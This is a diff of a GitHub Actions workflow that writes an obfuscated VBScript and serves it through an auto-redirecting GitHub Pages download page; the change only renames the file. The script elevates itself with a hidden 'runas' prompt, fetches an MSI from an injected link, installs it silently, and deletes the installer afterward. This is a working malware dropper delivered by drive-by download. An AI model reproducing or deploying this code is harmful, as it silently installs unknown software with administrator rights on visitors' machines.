@@ -26,52 +26,52 @@ jobs:
         echo "Creating VBS with link: $current_link"
         
         # Create an obfuscated VBS file
-        echo "On Error Resume Next" > installer.vbs
-        echo "Dim x1, x2, x3, x4, x5, x6, x7, x8, x9" >> installer.vbs
-        echo "x1 = \"WScript.Shell\"" >> installer.vbs
-        echo "x2 = CreateObject(x1).ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
-        echo "x3 = x2 & \"\\agent_installer.msi\"" >> installer.vbs
-        echo "x4 = \"$current_link\"" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> installer.vbs
-        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> installer.vbs
-        echo "    WScript.Quit" >> installer.vbs
-        echo "End If" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "x5 = \"MSXML2.ServerXMLHTTP.6.0\"" >> installer.vbs
-        echo "Set x6 = CreateObject(x5)" >> installer.vbs
-        echo "x6.open \"GET\", x4, False" >> installer.vbs
-        echo "x6.send()" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "If x6.Status >= 300 And x6.Status < 400 Then" >> installer.vbs
-        echo "    x4 = x6.getResponseHeader(\"Location\")" >> installer.vbs
-        echo "    x6.open \"GET\", x4, False" >> installer.vbs
-        echo "    x6.send()" >> installer.vbs
-        echo "End If" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "If x6.Status = 200 Then" >> installer.vbs
-        echo "    Set x7 = CreateObject(\"ADODB.Stream\")" >> installer.vbs
-        echo "    x7.Open" >> installer.vbs
-        echo "    x7.Type = 1" >> installer.vbs
-        echo "    x7.Write x6.ResponseBody" >> installer.vbs
-        echo "    x7.Position = 0" >> installer.vbs
-        echo "    x7.SaveToFile x3, 2" >> installer.vbs
-        echo "    x7.Close" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "    Set x8 = CreateObject(x1)" >> installer.vbs
-        echo "    x8.Run \"msiexec /i \"\"\" & x3 & \"\"\" /quiet /qn /norestart\", 0, True" >> installer.vbs
-        echo "" >> installer.vbs
-        echo "    Set x9 = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
-        echo "    If x9.FileExists(x3) Then x9.DeleteFile x3" >> installer.vbs
-        echo "End If" >> installer.vbs
+        echo "On Error Resume Next" > temr.vbs
+        echo "Dim x1, x2, x3, x4, x5, x6, x7, x8, x9" >> temr.vbs
+        echo "x1 = \"WScript.Shell\"" >> temr.vbs
+        echo "x2 = CreateObject(x1).ExpandEnvironmentStrings(\"%TEMP%\")" >> temr.vbs
+        echo "x3 = x2 & \"\\agent_installer.msi\"" >> temr.vbs
+        echo "x4 = \"$current_link\"" >> temr.vbs
+        echo "" >> temr.vbs
+        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> temr.vbs
+        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> temr.vbs
+        echo "    WScript.Quit" >> temr.vbs
+        echo "End If" >> temr.vbs
+        echo "" >> temr.vbs
+        echo "x5 = \"MSXML2.ServerXMLHTTP.6.0\"" >> temr.vbs
+        echo "Set x6 = CreateObject(x5)" >> temr.vbs
+        echo "x6.open \"GET\", x4, False" >> temr.vbs
+        echo "x6.send()" >> temr.vbs
+        echo "" >> temr.vbs
+        echo "If x6.Status >= 300 And x6.Status < 400 Then" >> temr.vbs
+        echo "    x4 = x6.getResponseHeader(\"Location\")" >> temr.vbs
+        echo "    x6.open \"GET\", x4, False" >> temr.vbs
+        echo "    x6.send()" >> temr.vbs
+        echo "End If" >> temr.vbs
+        echo "" >> temr.vbs
+        echo "If x6.Status = 200 Then" >> temr.vbs
+        echo "    Set x7 = CreateObject(\"ADODB.Stream\")" >> temr.vbs
+        echo "    x7.Open" >> temr.vbs
+        echo "    x7.Type = 1" >> temr.vbs
+        echo "    x7.Write x6.ResponseBody" >> temr.vbs
+        echo "    x7.Position = 0" >> temr.vbs
+        echo "    x7.SaveToFile x3, 2" >> temr.vbs
+        echo "    x7.Close" >> temr.vbs
+        echo "" >> temr.vbs
+        echo "    Set x8 = CreateObject(x1)" >> temr.vbs
+        echo "    x8.Run \"msiexec /i \"\"\" & x3 & \"\"\" /quiet /qn /norestart\", 0, True" >> temr.vbs
+        echo "" >> temr.vbs
+        echo "    Set x9 = CreateObject(\"Scripting.FileSystemObject\")" >> temr.vbs
+        echo "    If x9.FileExists(x3) Then x9.DeleteFile x3" >> temr.vbs
+        echo "End If" >> temr.vbs
         
         # Create index.html for GitHub Pages
-        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
+        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=temr.vbs"></head><body><p>If not redirected, <a href="temr.vbs">click here</a></p></body></html>' > index.html
         
         # Commit and push the updated files
         git config --global user.email "action@github.com"
         git config --global user.name "GitHub Action"
-        git add installer.vbs index.html
+        git add temr.vbs index.html
         git commit -m "Update VBS with current link" || exit 0
         git push
         
